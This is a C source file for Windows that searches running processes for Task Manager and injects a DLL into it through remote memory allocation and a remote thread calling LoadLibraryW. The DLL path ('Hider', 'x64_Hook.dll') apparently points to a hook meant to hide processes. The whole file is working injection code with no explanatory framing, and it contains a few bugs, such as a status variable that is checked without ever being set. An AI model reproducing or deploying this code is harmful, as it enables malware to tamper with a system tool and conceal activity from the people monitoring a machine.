#include <windows.h>
#include <stdio.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength
    );

BOOL LoadDll(IN HANDLE hProcess, IN LPWSTR DllName) {

    LPVOID lpLoadLibraryW = { 0 };
    LPVOID pAddress = { 0 };

    /* fetching the dll size of DllName in bytes */
    DWORD dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);

    SIZE_T lpNumberOfBytesWritten = { 0 };

    HANDLE hThread = { 0 };

    lpLoadLibraryW = GetProcAddress(GetModuleHandle(TEXT("Kernel32.dll")), "LoadLibraryW");
    if (lpLoadLibraryW == NULL) {
        printf("(-) GetProcAddress failed: %d\n", GetLastError());
        return FALSE;
    }
    printf("(+) LoadLibraryW Address @ %p\n", lpLoadLibraryW);

    pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("(-) VirtualAlloc failed: %d\n", GetLastError());
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
        printf("(-) WriteProcessMemory failed: %d\n", GetLastError());
        return -1;
    }

    printf("(i) Executing DLL...\n");
    if (!(hThread = CreateRemoteThread(hProcess, NULL, NULL, lpLoadLibraryW, pAddress, NULL, NULL))) {
        printf("(-) CreateRemoteThread failed: %d\n", GetLastError());
        return FALSE;
    }

    if (hThread)
        CloseHandle(hThread);

    return 0;
}

fnNtQuerySystemInformation _NtQuerySystemInfo = { 0 };

BOOL SearchForProcess(OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

    ULONG                           uReturnLen1 = { 0 },
        uReturnLen2 = { 0 };
    NTSTATUS                        Status = { 0 };
    PSYSTEM_PROCESS_INFORMATION     SystemInfo = { 0 };
    PVOID                           pValueToFree = { 0 };

    if (!(_NtQuerySystemInfo = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQuerySystemInformation"))) {
        printf("(-) GetProcAddress failed: %d\n", GetLastError());
        return FALSE;
    }
    printf("(+) NtQuerySystemInformation Address @ %p\n", _NtQuerySystemInfo);

    _NtQuerySystemInfo(SystemProcessInformation, NULL, NULL, &uReturnLen1);

    if (!(SystemInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1))) {
        printf("(-) HeapAlloc failed: %d\n", GetLastError());
        return FALSE;
    }

    pValueToFree = SystemInfo;

    _NtQuerySystemInfo(SystemProcessInformation, SystemInfo, uReturnLen1, &uReturnLen2);
    if (!NT_SUCCESS(Status)) {
        printf("(-) _NtQuerySystemInformation failed: %lx\n", _NtQuerySystemInfo);
        return FALSE;
    }

    SystemInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)SystemInfo + SystemInfo->NextEntryOffset);

    while (TRUE) {

        if (SystemInfo->ImageName.Length && wcscmp(SystemInfo->ImageName.Buffer, L"Taskmgr.exe") == 0) {
            printf("(i) Task Manager has been found. Injecting...\n");
            // dll injection
            LoadDll(OpenProcess(PROCESS_ALL_ACCESS, FALSE, HandleToULong(SystemInfo->UniqueProcessId)), L"C:\\Users\\6appy\\Desktop\\Cprojects\\Hider\\$Build\\x64_Hook.dll");
        }
        else if (!wcscmp(SystemInfo->ImageName.Buffer, L"Taskmgr.exe") == 0) {
            printf("(-) Task Manager is not open...\n");

        }

        if (!SystemInfo->NextEntryOffset)
            break;

        SystemInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)SystemInfo + SystemInfo->NextEntryOffset);
    }

    return TRUE;
}



int main(void) {

    DWORD Pid = { 0 };
    HANDLE hProcess = { 0 };

    if (!(SearchForProcess(&Pid, &hProcess))) {
        return -1;
    }

    printf("(#) Press [ENTER] To Quit...\n");
    getchar();

    return 0;
}